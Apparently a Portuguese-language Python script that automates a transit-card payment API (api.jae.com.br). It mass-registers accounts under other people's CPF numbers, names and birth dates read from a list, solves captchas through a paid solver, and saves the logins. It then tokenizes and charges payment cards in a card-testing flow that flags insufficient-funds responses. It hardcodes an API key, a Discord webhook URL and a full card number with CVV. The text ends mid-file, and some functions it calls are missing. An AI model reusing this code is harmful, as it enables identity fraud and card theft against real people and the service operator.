import requests
import json
import time
import base64 as b64
import random
import jwt
import re
import os
import uuid
import configparser
from datetime import datetime
from colorama import Fore, Back, Style, init

# Inicializar colorama
init(autoreset=True)

# Carregar credenciais de config.ini
CONFIG_FILE = "config.ini"

def carregar_config():
    config = configparser.ConfigParser()
    if not os.path.exists(CONFIG_FILE):
        print(f"❌ Arquivo {CONFIG_FILE} não encontrado! Crie-o com a seção [credenciais].")
        return None
    try:
        config.read(CONFIG_FILE, encoding="utf-8")
    except Exception:
        config.read(CONFIG_FILE)
    if not config.has_section("credenciais"):
        print("❌ Seção [credenciais] ausente no config.ini.")
        return None
    email = config.get("credenciais", "email", fallback="").strip()
    senha = config.get("credenciais", "senha", fallback="").strip()
    if not email or not senha:
        print("❌ 'email' ou 'senha' não definidos em [credenciais].")
        return None
    return {"email": email, "senha": senha}

CONFIG = carregar_config()
if CONFIG is None:
    raise SystemExit(1)

EMAIL_CONFIG = CONFIG["email"]
SENHA_CONFIG = CONFIG["senha"]

CAPMONSTER_API_KEY = "ba7686da6365e8bab23fc3d33659ad7d"
SITE_KEY = "6Lf8peEcAAAAAB0jNcCqVehfApzIVbZOG2s8yfub"
WEBSITE_URL = "https://api.jae.com.br"
DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1400541032566755489/QUwnOqF4Hio7gI2Hca9VJB7vmtukPD7ktvAxQvTVvUF3nXZp3SJRyiKDlWKHaXWVfnB3"

# Timeouts e limites para evitar travamentos
REQUEST_TIMEOUT = 30  # segundos para chamadas HTTP
CAPTCHA_POLL_MAX = 30  # número máximo de tentativas ao buscar solução do captcha
CAPTCHA_POLL_INTERVAL = 0.7  # intervalo entre tentativas em segundos

# Função para fazer autenticação e obter token JWT
def obter_token_jwt(cpf, senha):
    url = "https://api.jae.com.br/autenticacao"
    
    headers = {
        "accept-encoding": "gzip",
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }
    
    payload = {
        "usuario": cpf,
        "senha": senha
    }
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
        
        if response.status_code == 200:
            data = response.json()
            return data.get("token")
        else:
            print(f"Erro na autenticação: {response.status_code}")
            print(f"Resposta: {response.text}")
            return None
    except Exception as e:
        print(f"Erro ao fazer requisição de autenticação: {e}")
        return None

# Função para decodificar token JWT e extrair informações
def decodificar_token_jwt(token):
    try:
        # Decodifica o token sem verificar a assinatura (apenas para extrair dados)
        decoded = jwt.decode(token, options={"verify_signature": False})
        return decoded
    except Exception as e:
        print(f"Erro ao decodificar token JWT: {e}")
        return None

# Função para extrair JTI do token
def extrair_jti(token):
    decoded = decodificar_token_jwt(token)
    if decoded:
        return decoded.get("jti")
    return None

# Função para converter imagem para base64
def imagem_para_base64(caminho_imagem):
    with open(caminho_imagem, 'rb') as arquivo_imagem:
        return b64.b64encode(arquivo_imagem.read()).decode('utf-8')

# Gerando o base64 da imagem automaticamente
base64 = imagem_para_base64('6KKf5xRd.jpeg')

def salvar_conta_criada(cpf, senha, nome, email="", telefone="", codigo_cliente=""):
    """
    Salva uma conta criada com sucesso no arquivo contas.txt
    Formato: CPF|SENHA|NOME|EMAIL|TELEFONE|CODIGO_CLIENTE
    """
    try:
        linha_conta = f"{cpf}|{senha}|{nome}|{email}|{telefone}|{codigo_cliente}\n"
        
        with open("contas.txt", "a", encoding="utf-8") as arquivo:
            arquivo.write(linha_conta)
        
        print(f"✅ Conta salva em contas.txt: {cpf} - {nome}")
        return True
    except Exception as e:
        print(f"❌ Erro ao salvar conta: {e}")
        return False

def ler_dados_pagamento(arquivo_pagamento="pagamento.txt"):
    """
    Lê dados de cartão do arquivo pagamento.txt
    Formato esperado: numero|mes|ano|cvv
    Retorna um dicionário com os dados do cartão
    """
    if not os.path.exists(arquivo_pagamento):
        print(f"❌ Arquivo {arquivo_pagamento} não encontrado!")
        return None

def ler_lista_cartoes(arquivo_pagamento="pagamento.txt"):
    """
    Lê múltiplos cartões do arquivo pagamento.txt
    Formato esperado por linha: numero|mes|ano|cvv
    Retorna uma lista de dicionários com os dados dos cartões
    """
    cartoes = []
    if not os.path.exists(arquivo_pagamento):
        print(f"❌ Arquivo {arquivo_pagamento} não encontrado!")
        return cartoes
    try:
        with open(arquivo_pagamento, 'r', encoding='utf-8') as arquivo:
            for linha in arquivo:
                linha = linha.strip()
                if not linha:
                    continue
                partes = linha.split('|')
                if len(partes) >= 4:
                    cartoes.append({
                        "numero": partes[0].strip(),
                        "mes": partes[1].strip(),
                        "ano": partes[2].strip(),
                        "cvv": partes[3].strip()
                    })
                else:
                    print(f"⚠️ Linha inválida em {arquivo_pagamento}: {linha}")
        print(f"✅ Carregados {len(cartoes)} cartões de {arquivo_pagamento}")
    except Exception as e:
        print(f"❌ Erro ao ler cartões de {arquivo_pagamento}: {e}")
    return cartoes
    
    try:
        with open(arquivo_pagamento, 'r', encoding='utf-8') as arquivo:
            linha = arquivo.readline().strip()
            if linha:
                partes = linha.split('|')
                if len(partes) >= 4:
                    return {
                        "numero": partes[0].strip(),
                        "mes": partes[1].strip(),
                        "ano": partes[2].strip(),
                        "cvv": partes[3].strip()
                    }
                else:
                    print(f"❌ Formato inválido no arquivo {arquivo_pagamento}. Use: numero|mes|ano|cvv")
                    return None
            else:
                print(f"❌ Arquivo {arquivo_pagamento} está vazio!")
                return None
    except Exception as e:
        print(f"❌ Erro ao ler arquivo {arquivo_pagamento}: {e}")
        return None

def ler_contas_criadas(arquivo_contas="contas.txt"):
    """
    Lê contas criadas do arquivo contas.txt
    Formato: CPF|SENHA|NOME|EMAIL|TELEFONE|CODIGO_CLIENTE
    Retorna uma lista de dicionários com os dados das contas
    """
    if not os.path.exists(arquivo_contas):
        print(f"❌ Arquivo {arquivo_contas} não encontrado!")
        return []
    
    contas = []
    try:
        with open(arquivo_contas, 'r', encoding='utf-8') as arquivo:
            for linha in arquivo:
                linha = linha.strip()
                if linha:
                    partes = linha.split('|')
                    if len(partes) >= 3:
                        conta = {
                            "cpf": partes[0].strip(),
                            "senha": partes[1].strip(),
                            "nome": partes[2].strip(),
                            "email": partes[3].strip() if len(partes) > 3 else "",
                            "telefone": partes[4].strip() if len(partes) > 4 else "",
                            "codigo_cliente": partes[5].strip() if len(partes) > 5 else ""
                        }
                        contas.append(conta)
        
        print(f"✅ Carregadas {len(contas)} contas do arquivo {arquivo_contas}")
        return contas
    except Exception as e:
        print(f"❌ Erro ao ler arquivo {arquivo_contas}: {e}")
        return []

def processar_lista_txt(caminho_arquivo="lista.txt"):
    """
    Processa o arquivo lista.txt e extrai CPF, nome e data de nascimento
    Retorna uma lista de dicionários com os dados processados
    """
    if not os.path.exists(caminho_arquivo):
        print(f"Arquivo {caminho_arquivo} não encontrado!")
        return []
    
    dados_processados = []
    
    try:
        with open(caminho_arquivo, 'r', encoding='utf-8') as arquivo:
            for linha in arquivo:
                linha = linha.strip()
                if linha:  # Ignora linhas vazias
                    dados = extrair_dados_linha(linha)
                    if dados:
                        dados_processados.append(dados)
        
        print(f"✅ Processados {len(dados_processados)} registros do arquivo {caminho_arquivo}")
        return dados_processados
    
    except Exception as e:
        print(f"Erro ao processar arquivo {caminho_arquivo}: {e}")
        return []

def remover_linha_processada(caminho_arquivo, cpf_processado):
    """
    Remove a linha correspondente ao CPF processado do arquivo lista.txt
    """
    try:
        # Lê todas as linhas do arquivo
        with open(caminho_arquivo, 'r', encoding='utf-8') as arquivo:
            linhas = arquivo.readlines()
        
        # Filtra as linhas, removendo a que contém o CPF processado
        linhas_filtradas = []
        linha_removida = False
        
        for linha in linhas:
            linha_limpa = linha.strip()
            if linha_limpa:
                dados = extrair_dados_linha(linha_limpa)
                if dados and dados['cpf'] == cpf_processado:
                    print(f"🗑️ Removendo linha do CPF {cpf_processado} do arquivo {caminho_arquivo}")
                    linha_removida = True
                    continue
            linhas_filtradas.append(linha)
        
        # Reescreve o arquivo sem a linha processada
        if linha_removida:
            with open(caminho_arquivo, 'w', encoding='utf-8') as arquivo:
                arquivo.writelines(linhas_filtradas)
            print(f"✅ Linha do CPF {cpf_processado} removida com sucesso")
        else:
            print(f"⚠️ CPF {cpf_processado} não encontrado no arquivo")
            
    except Exception as e:
        print(f"❌ Erro ao remover linha do arquivo {caminho_arquivo}: {e}")

# Função para extrair dados de uma linha
def extrair_dados_linha(linha):
    """
    Extrai CPF, nome e data de nascimento de uma linha do formato:
    CPF|Nome|Gênero|Data de nascimento
    Exemplo: 69857741215|Israel Welles dos Santos Aquino|M - Masculino|13/12/1981
    """
    try:
        # Divide a linha pelos separadores pipe (|)
        partes = linha.split('|')
        
        # Verifica se tem pelo menos 4 partes (CPF, Nome, Gênero, Data)
        if len(partes) < 4:
            print(f"Formato inválido na linha: {linha}")
            return None
        
        cpf = partes[0].strip()
        nome = partes[1].strip()
        genero = partes[2].strip()
        data_nascimento_original = partes[3].strip()
        
        # Valida CPF básico
        if not validar_cpf_basico(cpf):
            print(f"CPF inválido: {cpf}")
            return None
        
        # Converte data de DD/MM/YYYY para YYYY-MM-DD (se necessário)
        data_nascimento = converter_data_formato(data_nascimento_original)
        
        return {
            'cpf': cpf,
            'nome': nome,
            'genero': genero,
            'data_nascimento': data_nascimento,
            'data_nascimento_original': data_nascimento_original
        }
    
    except Exception as e:
        print(f"Erro ao processar linha: {e}")
        return None

# Função para validar CPF básico
def validar_cpf_basico(cpf):
    """
    Validação básica de CPF (apenas formato)
    """
    return len(cpf) == 11 and cpf.isdigit()

def converter_data_formato(data_str):
    """
    Converte data de DD/MM/YYYY para YYYY-MM-DD
    Se a data já estiver no formato YYYY-MM-DD, retorna como está
    """
    try:
        # Verifica se já está no formato YYYY-MM-DD
        if re.match(r'^\d{4}-\d{2}-\d{2}$', data_str):
            return data_str
        
        # Converte de DD/MM/YYYY para YYYY-MM-DD
        if re.match(r'^\d{2}/\d{2}/\d{4}$', data_str):
            dia, mes, ano = data_str.split('/')
            return f"{ano}-{mes}-{dia}"
        
        # Se não conseguir converter, retorna a data original
        print(f"Formato de data não reconhecido: {data_str}")
        return data_str
        
    except Exception as e:
        print(f"Erro ao converter data {data_str}: {e}")
        return data_str

def resolver_captcha():
    capmonster_url = "https://api.capmonster.cloud/createTask"
    
    task_payload = {
        "clientKey": CAPMONSTER_API_KEY,
        "task": {
            "type": "RecaptchaV2TaskProxyless",
            "websiteURL": WEBSITE_URL,
            "websiteKey": SITE_KEY
        }
    }
    
    response = requests.post(capmonster_url, json=task_payload, timeout=REQUEST_TIMEOUT)
    task_data = response.json()
    
    if task_data.get("errorId") != 0:
        print("Erro ao criar tarefa:", task_data.get("errorDescription"))
        return None
    
    task_id = task_data["taskId"]
    
    result_url = "https://api.capmonster.cloud/getTaskResult"
    result_payload = {"clientKey": CAPMONSTER_API_KEY, "taskId": task_id}
    
    for i in range(CAPTCHA_POLL_MAX):
        time.sleep(CAPTCHA_POLL_INTERVAL)
        result_response = requests.post(result_url, json=result_payload, timeout=REQUEST_TIMEOUT)
        result_data = result_response.json()
        
        if result_data.get("status") == "ready":
            return result_data["solution"]["gRecaptchaResponse"]
        
        print(f"Aguardando resolução... ({i+1}/{CAPTCHA_POLL_MAX})")
    
    print("Tempo limite excedido para resolver captcha")
    return None

def fazer_cadastro(token_captcha, nome=None, cpf=None, data_nascimento=None):
    url = "https://api.jae.com.br/app-gateway/api/cliente/cadastrar"

    headers = {
        "accept-encoding": "gzip",
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }

    # Usa dados gerados se não fornecidos
    if not nome:
        nome = gerar_nome_brasileiro()
    if not cpf:
        cpf = gerar_cpf_rj()
    if not data_nascimento:
        data_nascimento = "1970-02-02"  # Fallback apenas se não fornecida

    payload = {
        "nome": nome,
        "nomeSocial": "",
        "tipoDocumento": "CPF",
        "numeroDocumento": cpf,
        "numeroDocumentoAlternativo": "",
        "dataNascimento": data_nascimento,
        "celular": "13988238323",
        "email": EMAIL_CONFIG,
        "senha": SENHA_CONFIG,
        "confirmacaoSenha": SENHA_CONFIG,
        "sexo": None,
        "logradouro": None,
        "numero": None,
        "complemento": None,
        "cidade": None,
        "bairro": None,
        "cep": None,
        "estado": None,
        "uf": None,
        "base64Imagem": base64,
        "dispensaBiometria": False,
        "token": token_captcha,
        "idOperadora": 0,
        "codigoVerificacao": ""
    }

    response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
    
    print("Status Code:", response.status_code)
    print("Response Body:", response.text)
    
    return response, nome, cpf

def processar_cadastros_lista_simples(caminho_arquivo="lista.txt", limite=None):
    """
    Processa cadastros em lote usando dados do arquivo lista.txt
    APENAS CRIA AS CONTAS - NÃO FAZ PAGAMENTO
    """
    print("=== PROCESSANDO CADASTROS DA LISTA (APENAS CRIAÇÃO) ===")
    
    # Carrega dados do arquivo
    dados_lista = processar_lista_txt(caminho_arquivo)
    
    if not dados_lista:
        print("❌ Nenhum dado válido encontrado no arquivo")
        return
    
    # Aplica limite se especificado
    if limite:
        dados_lista = dados_lista[:limite]
        print(f"Processando apenas os primeiros {limite} registros")
    
    sucessos = 0
    falhas = 0
    
    for i, dados in enumerate(dados_lista, 1):
        print(f"\n--- PROCESSANDO REGISTRO {i}/{len(dados_lista)} ---")
        print(f"CPF: {dados['cpf']}")
        print(f"Nome: {dados['nome']}")
        print(f"Data Nascimento: {dados['data_nascimento']}")
        
        # Valida CPF básico
        if not validar_cpf_basico(dados['cpf']):
            print("❌ CPF inválido, pulando...")
            falhas += 1
            continue
        
        # Resolve captcha
        print("Resolvendo captcha...")
        token_captcha = resolver_captcha()
        
        if not token_captcha:
            print("❌ Falha ao resolver captcha, pulando...")
            falhas += 1
            continue
        
        # Faz cadastro
        print("Fazendo cadastro...")
        response, nome_usado, cpf_usado = fazer_cadastro(
            token_captcha, 
            dados['nome'], 
            dados['cpf'], 
            dados['data_nascimento']
        )
        
        if response.status_code == 201:
            print("✅ Cadastro realizado com sucesso!")
            cadastro_data = response.json()
            print(f"Código: {cadastro_data.get('codigo')}")
            print(f"ID Cliente: {cadastro_data.get('idCliente')}")
            
            # Salvar conta criada com sucesso
            email_fixo = EMAIL_CONFIG
            salvar_conta_criada(
                cpf_usado, 
                SENHA_CONFIG, 
                nome_usado, 
                email_fixo, 
                "13988238323", 
                str(cadastro_data.get('codigo', ''))
            )
            
            sucessos += 1
            
            # Remove a linha processada do arquivo após sucesso
            remover_linha_processada(caminho_arquivo, cpf_usado)
            
        else:
            print("❌ Falha no cadastro")
            falhas += 1
        
        # Pausa entre requisições para evitar rate limiting
        if i < len(dados_lista):
            print("Aguardando 2 segundos...")
            time.sleep(0.5)
    
    print(f"\n=== RESUMO FINAL ===")
    print(f"✅ Sucessos: {sucessos}")
    print(f"❌ Falhas: {falhas}")
    print(f"📊 Total processado: {len(dados_lista)}")

# Função para processar cadastros em lote da lista (VERSÃO COMPLETA COM PAGAMENTO)
def processar_cadastros_lista(caminho_arquivo="lista.txt", limite=None):
    """
    Processa cadastros em lote usando dados do arquivo lista.txt
    """
    print("=== PROCESSANDO CADASTROS DA LISTA ===")
    
    # Carrega dados do arquivo
    dados_lista = processar_lista_txt(caminho_arquivo)
    
    if not dados_lista:
        print("❌ Nenhum dado válido encontrado no arquivo")
        return
    
    # Aplica limite se especificado
    if limite:
        dados_lista = dados_lista[:limite]
        print(f"Processando apenas os primeiros {limite} registros")
    
    sucessos = 0
    falhas = 0
    
    for i, dados in enumerate(dados_lista, 1):
        print(f"\n--- PROCESSANDO REGISTRO {i}/{len(dados_lista)} ---")
        print(f"CPF: {dados['cpf']}")
        print(f"Nome: {dados['nome']}")
        print(f"Data Nascimento: {dados['data_nascimento']}")
        
        # Valida CPF básico
        if not validar_cpf_basico(dados['cpf']):
            print("❌ CPF inválido, pulando...")
            falhas += 1
            continue
        
        # Resolve captcha
        print("Resolvendo captcha...")
        token_captcha = resolver_captcha()
        
        if not token_captcha:
            print("❌ Falha ao resolver captcha, pulando...")
            falhas += 1
            continue
        
        # Faz cadastro
        print("Fazendo cadastro...")
        response, nome_usado, cpf_usado = fazer_cadastro(
            token_captcha, 
            dados['nome'], 
            dados['cpf'], 
            dados['data_nascimento']
        )
        
        if response.status_code == 201:
            print("✅ Cadastro realizado com sucesso!")
            cadastro_data = response.json()
            print(f"Código: {cadastro_data.get('codigo')}")
            print(f"ID Cliente: {cadastro_data.get('idCliente')}")

            # Salvar conta criada com sucesso
            email_fixo = EMAIL_CONFIG
            salvar_conta_criada(
                cpf_usado,
                SENHA_CONFIG,
                nome_usado,
                email_fixo,
                "13988238323",
                str(cadastro_data.get('codigo', ''))
            )

            sucessos += 1

            # Fazer autenticação e obter token do cartão
            print("Obtendo token JWT...")
            token_jwt = obter_token_jwt(cpf_usado, SENHA_CONFIG)
            if token_jwt:
                print("✅ Token JWT obtido!")
                
                # Extrair JTI do token
                jti = extrair_jti(token_jwt)
                if jti:
                    print(f"JTI extraído: {jti}")
                    
                    # Obter conta-acesso usando JTI
                    conta_data = obter_conta_acesso(token_jwt, jti)
                    if conta_data:
                        print("✅ Conta-acesso obtida!")
                        
                        # Atualizar device
                        device_result = atualizar_device(token_jwt, cadastro_data.get('codigo'))
                        if device_result:
                            print("✅ Device atualizado!")
                        else:
                            print("❌ Falha ao atualizar device")
                    else:
                        print("❌ Falha ao obter conta-acesso")
                else:
                    print("❌ Falha ao extrair JTI")
                
                # Verificar pedidos em aberto antes de obter token do cartão
                print("Verificando pedidos em aberto...")
                pedidos_data = verificar_pedidos_em_aberto(token_jwt, cadastro_data.get('codigo'))
                if pedidos_data:
                    print("✅ Pedidos em aberto verificados!")
                else:
                    print("❌ Falha ao verificar pedidos em aberto")
                
                print("Obtendo token do cartão...")
                token_cartao_data = obter_token_cartao(token_jwt, cadastro_data.get('codigo'))
                if token_cartao_data:
                    print("✅ Token do cartão obtido!")
                    
                    # Criar pedido após obter token do cartão
                    print("Criando pedido...")
                    pedido_data = criar_pedido(token_jwt, cadastro_data.get('codigo'))
                    if pedido_data:
                        print("✅ Pedido criado com sucesso!")
                        
                        # Processar pagamento após criar pedido
                        order_id = pedido_data.get('numero')
                        if order_id and token_cartao_data.get('token'):
                            print("Processando pagamento...")
                            pagamento_data = processar_pagamento_cartao(
                                token_jwt, 
                                order_id, 
                                10.0,  # Valor do pedido
                                token_cartao_data.get('token'),
                                {
                                    'codigo': cadastro_data.get('codigo'),
                                    'nome': nome_usado,
                                    'email': EMAIL_CONFIG,
                                    'cpf': cpf_usado,
                                    'telefone': "13988238323"
                                }
                            )
                            if pagamento_data:
                                print("✅ Pagamento processado com sucesso!")
                            else:
                                print("❌ Falha ao processar pagamento")
                        else:
                            print("❌ Dados insuficientes para processar pagamento")
                    else:
                        print("❌ Falha ao criar pedido")
                else:
                    print("❌ Falha ao obter token do cartão")
            else:
                print("❌ Falha ao obter token JWT")
            
            # Remove a linha processada do arquivo após sucesso completo
            remover_linha_processada(caminho_arquivo, cpf_usado)
            
        else:
            print("❌ Falha no cadastro")
            falhas += 1
        
        # Pausa entre requisições para evitar rate limiting
        if i < len(dados_lista):
            print("Aguardando 2 segundos...")
            time.sleep(0.5)
    
    print(f"\n=== RESUMO FINAL ===")
    print(f"✅ Sucessos: {sucessos}")
    print(f"❌ Falhas: {falhas}")
    print(f"📊 Total processado: {len(dados_lista)}")

# Função para verificar pedidos em aberto
def verificar_pedidos_em_aberto(jwt_token, codigo_cliente, id_produto=6):
    """
    Verifica pedidos em aberto para um cliente específico
    """
    url = f"https://api.jae.com.br/app-gateway/api/pedido/em-aberto/idCliente/{codigo_cliente}/idProduto/{id_produto}"
    
    headers = {
        'accept-encoding': 'gzip',
        'authorization': jwt_token,
        'content-type': 'application/json; charset=UTF-8',
        'host': 'api.jae.com.br',
        'user-agent': 'Dart/3.3 (dart:io)'
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        print(f"Status Code verificar_pedidos_em_aberto: {response.status_code}")
        
        if response.status_code == 200:
            data = response.json()
            print(f"Pedidos em aberto: {data}")
            return data
        else:
            print(f"Erro ao verificar pedidos em aberto: {response.text}")
            return None
    except Exception as e:
        print(f"Erro na requisição verificar_pedidos_em_aberto: {e}")
        return None

# Função para obter token do cartão
def obter_token_cartao(jwt_token, codigo_cliente, numero_cartao="5390909133296299"):
    # Primeiro resolve o captcha
    print("Resolvendo captcha para token do cartão...")
    token_captcha = resolver_captcha()
    
    if not token_captcha:
        print("Falha ao resolver captcha para token do cartão")
        return None
    
    print(f"Token captcha obtido: {token_captcha[:50]}...")
    
    url = "https://api.jae.com.br/app-gateway/api/pagamento/cartao/token"
    
    headers = {
        "accept-encoding": "gzip",
        "authorization": jwt_token,  # Sem o prefixo "Bearer"
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }
    
    payload = {
        "card_number": numero_cartao,
        "customer_id": str(codigo_cliente),
        "token": token_captcha  # Resposta do CAPTCHA resolvido
    }
    
    print(f"Payload sendo enviado: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")
        
        if response.status_code == 200:
            # A API retorna o token como texto simples, não JSON
            token_cartao = response.text.strip()
            print(f"✅ Token do cartão obtido: {token_cartao}")
            return {"token": token_cartao}
        else:
            print(f"Erro ao obter token do cartão: {response.status_code}")
            return None
    except Exception as e:
        print(f"Erro ao fazer requisição de token do cartão: {e}")
        return None

# Função para criar pedido
def criar_pedido(jwt_token, codigo_cliente, valor_pedido=147.0):
    """
    Cria um pedido para o cliente
    """
    url = "https://api.jae.com.br/app-gateway/api/pedido/realizar"
    
    headers = {
        "accept-encoding": "gzip",
        "authorization": jwt_token,  # Sem o prefixo "Bearer"
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }
    
    payload = {
        "idCliente": codigo_cliente,
        "idTipoPerfilCliente": "USUARIO",
        "valorPedido": valor_pedido,
        "tipoPagamento": ["CARTAO_DE_CREDITO"],
        "valorCalculadoPedido": valor_pedido,
        "nrSeqEndereco": 0,
        "comTaxaEntrega": False,
        "itensPedido": [
            {
                "idItem": None,
                "idPedido": None,
                "idAplicacao": 1,
                "idProduto": 6,
                "idTipoItemPedido": 11,
                "valorCredito": valor_pedido,
                "idTipoPerfilCliente": "USUARIO",
                "idCliente": codigo_cliente,
                "idMotivoCancelamento": None,
                "valorProduto": 0.0,
                "numeroLogicoMidia": None,
                "idLinha": 0,
                "idSecao": 0,
                "quantidade": None,
                "origem": None,
                "destino": None,
                "preco": None,
                "total": valor_pedido,
                "id": None,
                "idTipoUtilizacaoQR": None,
                "idTipoMidia": None
            }
        ]
    }
    
    print(f"Criando pedido para cliente {codigo_cliente}...")
    print(f"Payload do pedido: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")
        
        if response.status_code == 200 or response.status_code == 201:
            data = response.json()
            print(f"✅ Pedido criado com sucesso: {data}")
            return data
        else:
            print(f"Erro ao criar pedido: {response.status_code}")
            return None
    except Exception as e:
        print(f"Erro ao fazer requisição de criar pedido: {e}")
        return None

# Função para detectar status de pagamento
def detectar_status_pagamento(response_data):
    """
    Detecta se o pagamento foi aprovado ou rejeitado baseado na resposta
    """
    if not response_data:
        return "ERRO", "Resposta vazia"
    
    # Se for string, tentar converter para dict
    if isinstance(response_data, str):
        try:
            response_data = json.loads(response_data)
        except:
            return "ERRO", "Resposta inválida"
    
    # Verificar status do pagamento
    status = response_data.get('status', '').upper()
    
    if status == 'APPROVED':
        reason_message = response_data.get('credit', {}).get('reason_message', 'Aprovado')
        return "APROVADO", reason_message
    elif status == 'DENIED' or status == 'REJECTED':
        # Verificar se há detalhes sobre saldo insuficiente
        details = response_data.get('details', [])
        message = response_data.get('message', '')
        
        # Procurar por indicadores de saldo insuficiente
        for detail in details:
            description = detail.get('description', '').lower()
            description_detail = detail.get('description_detail', '').lower()
            
            if 'saldo insuficiente' in description or 'insufficient' in description:
                return "REJEITADO", "Saldo Insuficiente"
            if 'not approved' in detail.get('status', '').lower():
                if 'saldo insuficiente' in description or 'insufficient' in description:
                    return "REJEITADO", "Saldo Insuficiente"
        
        # Se não encontrou saldo insuficiente, é outro tipo de rejeição
        reason_message = response_data.get('credit', {}).get('reason_message', message or 'Rejeitado')
        return "REJEITADO", reason_message
    elif status == 'PENDING':
        return "PENDENTE", "Pagamento pendente"
    else:
        return "DESCONHECIDO", f"Status: {status}"

# Função para processar pagamento com cartão de crédito
def processar_pagamento_cartao(jwt_token, order_id, amount, token_cartao, customer_data, card_data=None):
    """
    Processa o pagamento de um pedido com cartão de crédito
    """
    url = "https://api.jae.com.br/app-gateway/api/pagamento/cartao/credito"
    
    headers = {
        "accept-encoding": "gzip",
        "authorization": jwt_token,  # Sem o prefixo "Bearer"
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }
    
    # Dados padrão do cartão se não fornecidos
    if not card_data:
        card_data = {
            "cardholder_name": "Rogerio moreno",
            "security_code": "752",
            "brand": "Mastercard",
            "expiration_month": "03",
            "expiration_year": "33"
        }
    
    payload = {
        "orderId": str(order_id),
        "card": {
            "number_token": token_cartao,
            "cardholder_name": card_data.get("cardholder_name", "a k j"),
            "security_code": card_data.get("security_code", "123"),
            "brand": card_data.get("brand", "Visa"),
            "expiration_month": card_data.get("expiration_month", "12"),
            "expiration_year": card_data.get("expiration_year", "30")
        },
        "customer": {
            "customer_id": str(customer_data.get("codigo", "")),
            "first_name": customer_data.get("nome", "").split()[0] if customer_data.get("nome") else "",
            "last_name": " ".join(customer_data.get("nome", "").split()[1:]) if customer_data.get("nome") and len(customer_data.get("nome", "").split()) > 1 else "",
            "name": customer_data.get("nome", ""),
            "email": customer_data.get("email", ""),
            "document_type": "CPF",
            "document_number": customer_data.get("cpf", ""),
            "phone_number": customer_data.get("telefone", ""),
            "billing_address": []
        }
    }
    
    print(f"{Fore.CYAN}Processando pagamento para pedido {order_id}...{Style.RESET_ALL}")
    print(f"Payload do pagamento: {json.dumps(payload, indent=2)}")
    
    try:
        response = requests.post(url, headers=headers, data=json.dumps(payload), timeout=REQUEST_TIMEOUT)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")
        
        if response.status_code == 200 or response.status_code == 201:
            try:
                data = response.json()
                
                # Detectar status do pagamento
                status_pagamento, mensagem = detectar_status_pagamento(data)
                
                if status_pagamento == "APROVADO":
                    print(f"{Fore.GREEN}✅ PAGAMENTO APROVADO!{Style.RESET_ALL}")
                    print(f"{Fore.GREEN}💳 {mensagem}{Style.RESET_ALL}")
                    if 'payment_id' in data:
                        print(f"{Fore.GREEN}🆔 ID do Pagamento: {data['payment_id']}{Style.RESET_ALL}")
                    if 'credit' in data and 'authorization_code' in data['credit']:
                        print(f"{Fore.GREEN}🔐 Código de Autorização: {data['credit']['authorization_code']}{Style.RESET_ALL}")
                elif status_pagamento == "REJEITADO":
                    print(f"{Fore.RED}❌ PAGAMENTO REJEITADO!{Style.RESET_ALL}")
                    print(f"{Fore.RED}💳 {mensagem}{Style.RESET_ALL}")
                elif status_pagamento == "PENDENTE":
                    print(f"{Fore.YELLOW}⏳ PAGAMENTO PENDENTE{Style.RESET_ALL}")
                    print(f"{Fore.YELLOW}💳 {mensagem}{Style.RESET_ALL}")
                else:
                    print(f"{Fore.MAGENTA}❓ STATUS DESCONHECIDO: {mensagem}{Style.RESET_ALL}")
                
                return data
            except:
                # Se não for JSON, retorna o texto
                print(f"{Fore.GREEN}✅ Pagamento processado com sucesso: {response.text}{Style.RESET_ALL}")
                return {"status": "success", "response": response.text}
        else:
            print(f"{Fore.RED}❌ Erro ao processar pagamento: {response.status_code}{Style.RESET_ALL}")
            print(f"{Fore.RED}📄 Resposta: {response.text}{Style.RESET_ALL}")
            return None
    except Exception as e:
        print(f"{Fore.RED}❌ Erro ao fazer requisição de pagamento: {e}{Style.RESET_ALL}")
        return None

# Função principal que executa todo o fluxo usando dados do lista.txt
def executar_fluxo_completo():
    print("=== INICIANDO FLUXO COMPLETO ===")
    print("Usando dados do arquivo lista.txt")
    
    # Processa cadastros da lista
    processar_cadastros_lista("lista.txt", limite=1)  # Processa apenas 1 registro por vez

# Função para obter conta-acesso usando JTI
def obter_conta_acesso(jwt_token, jti):
    """
    Obtém informações da conta-acesso usando o JTI extraído do token JWT
    """
    url = f"https://api.jae.com.br/app-gateway/api/cliente/conta-acesso/{jti}"
    
    headers = {
        "accept-encoding": "gzip",
        "authorization": jwt_token,
        "content-type": "application/json; charset=UTF-8",
        "host": "api.jae.com.br",
        "user-agent": "Dart/3.3 (dart:io)"
    }
    
    try:
        print(f"Obtendo conta-acesso para JTI: {jti}")
        response = requests.get(url, headers=headers, timeout=REQUEST_TIMEOUT)
        
        print(f"Status Code: {response.status_code}")
        print(f"Response Body: {response.text}")
        
        if response.status_code == 200:
            conta_data = response.json()
            print("✅ Conta-acesso obtida com sucesso!")
            return conta_data
        else:
            print(f"❌ Erro ao obter conta-acesso: {response.status_code}")
            return None
            
    except Exception as e:
        print(f"Erro ao obter conta-acesso: {e}")
        return None

# Função para atualizar device
